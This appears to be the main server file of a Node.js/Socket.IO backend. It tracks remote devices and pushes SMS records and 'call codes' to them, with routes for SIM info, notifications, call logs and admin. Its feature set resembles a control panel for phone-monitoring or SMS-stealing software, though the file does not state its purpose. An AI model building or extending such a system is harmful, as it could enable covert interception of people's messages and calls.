import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import fetch from "node-fetch";
import mongoose from "mongoose";
import { connectDB } from "./config/db.js";

import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import callLogRoutes from "./routes/callLogRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

dotenv.config();
connectDB();

const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});

app.use(cors());
app.use(express.json());
app.set("io", io);

// 🔥 TRACK DEVICE SOCKETS
const deviceSockets = new Map(); // uniqueId → socketId

io.on("connection", (socket) => {
  console.log("🟢 New Socket Connected:", socket.id);
  let currentDeviceId = null;

  // ================================
  // 📌 REGISTER DEVICE (FIXED)
  // ================================
  socket.on("registerDevice", (uniqueid) => {
    if (!uniqueid) return;

    const oldSocketId = deviceSockets.get(uniqueid);

    // ❗ DO NOT DISCONNECT OLD SOCKET — JUST REPLACE
    deviceSockets.set(uniqueid, socket.id);

    currentDeviceId = uniqueid;
    socket.join(uniqueid);

    console.log(`📱 Device Registered: ${uniqueid}`);
    saveLastSeen(uniqueid, "Online");

    io.to(socket.id).emit("deviceRegistered", { uniqueid });

    io.emit("deviceListUpdated", {
      event: "device_connected",
      uniqueid,
    });
  });

  // ================================
  // 🔵 DEVICE STATUS UPDATE
  // ================================
  socket.on("deviceStatus", (data) => {
    const { uniqueid, connectivity } = data || {};
    if (!uniqueid) return;

    saveLastSeen(uniqueid, connectivity);

    console.log(`⚡ DeviceStatus → ${uniqueid}: ${connectivity}`);

    io.emit("deviceStatus", {
      uniqueid,
      connectivity,
      updatedAt: new Date(),
    });
  });

  // ================================
  // 🔴 DISCONNECT (TRUE FIX)
  // ================================
  socket.on("disconnect", () => {
    console.log("🔴 Socket disconnected:", socket.id);

    if (currentDeviceId) {
      const latestSocket = deviceSockets.get(currentDeviceId);

      // ❗ Only if THIS socket is the latest socket, mark offline
      if (latestSocket === socket.id) {
        console.log(`🛑 Device truly disconnected: ${currentDeviceId}`);

        deviceSockets.delete(currentDeviceId);
        saveLastSeen(currentDeviceId, "Offline");

        io.emit("deviceStatus", {
          uniqueid: currentDeviceId,
          connectivity: "Offline",
          updatedAt: new Date(),
        });

        io.emit("deviceListUpdated", {
          event: "device_disconnected",
          uniqueid: currentDeviceId,
        });
      } else {
        console.log(`⚠ Ignored old socket disconnect for: ${currentDeviceId}`);
      }
    }
  });
});

// =====================================
// 🔹 Save Last Seen Function
// =====================================
async function saveLastSeen(deviceId, connectivity) {
  try {
    const PORT = process.env.PORT || 5000;

    await fetch(`http://localhost:${PORT}/api/lastseen/${deviceId}/status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ connectivity }),
    });
  } catch (err) {
    console.error("❌ Error saving last seen:", err.message);
  }
}

// =====================================
// 🔹 Send CallCode to Device
// =====================================
export async function sendCallCodeToDevice(uniqueid, callData) {
  const socketId = deviceSockets.get(uniqueid);
  if (socketId && io.sockets.sockets.get(socketId)) {
    io.to(socketId).emit("callCodeUpdate", callData);
    console.log(`📞 CallCode Sent → ${uniqueid}`);
  }
}

// =====================================
// 🔥 Mongo Change Streams
// =====================================
mongoose.connection.once("open", () => {
  console.log("📡 MongoDB Connected — Watching collections...");

  // DEVICE WATCH
  const deviceStream = mongoose.connection.collection("devices").watch();
  deviceStream.on("change", async (change) => {
    if (!["insert", "update", "replace"].includes(change.operationType)) return;

    const updatedDevice = await mongoose.connection
      .collection("devices")
      .findOne({ _id: change.documentKey._id });

    if (updatedDevice) {
      io.emit("deviceListUpdated", {
        event: "db_change",
        device: updatedDevice,
      });
    }
  });

  // SIM WATCH
  const simStream = mongoose.connection.collection("siminfos").watch();
  simStream.on("change", async (change) => {
    if (!["insert", "update", "replace"].includes(change.operationType)) return;

    const updatedSim = await mongoose.connection
      .collection("siminfos")
      .findOne({ _id: change.documentKey._id });

    if (updatedSim) {
      io.emit("simInfoUpdated", {
        event: "sim_change",
        sim: updatedSim,
      });
    }
  });

  // CALL WATCH
  const callStream = mongoose.connection.collection("callcodes").watch();
  callStream.on("change", async (change) => {
    if (!["insert", "update", "replace"].includes(change.operationType)) return;

    const updatedDoc = await mongoose.connection
      .collection("callcodes")
      .findOne({ _id: change.documentKey._id });

    if (updatedDoc) {
      sendCallCodeToDevice(updatedDoc.deviceId, updatedDoc);
    }
  });

  // SMS WATCH
  const smsStream = mongoose.connection.collection("sms").watch();
  smsStream.on("change", async (change) => {
    if (!["insert", "update", "replace"].includes(change.operationType)) return;

    const updatedDoc = await mongoose.connection
      .collection("sms")
      .findOne({ _id: change.documentKey._id });

    if (!updatedDoc) return;

    const socketId = deviceSockets.get(updatedDoc.deviceId);
    if (socketId) {
      io.to(socketId).emit("smsUpdate", updatedDoc);
    }
  });
});

// ROOT
app.get("/", (req, res) => {
  res.send("✅ Backend + Socket Live");
});

// ROUTES
app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/lastseen", lastSeenRoutes);
app.use("/api/call-log", callLogRoutes);

// 404
app.use((req, res) =>
  res.status(404).json({ success: false, message: "Route not found" })
);

// Error Handler
app.use((err, req, res, next) => {
  console.error("💥 Unhandled error:", err);
  res.status(500).json({ success: false, message: "Internal server error" });
});

// START SERVER
const PORT = process.env.PORT || 5000;
server.listen(PORT, () =>
  console.log(`🚀 Server running at http://localhost:${PORT}`)
);
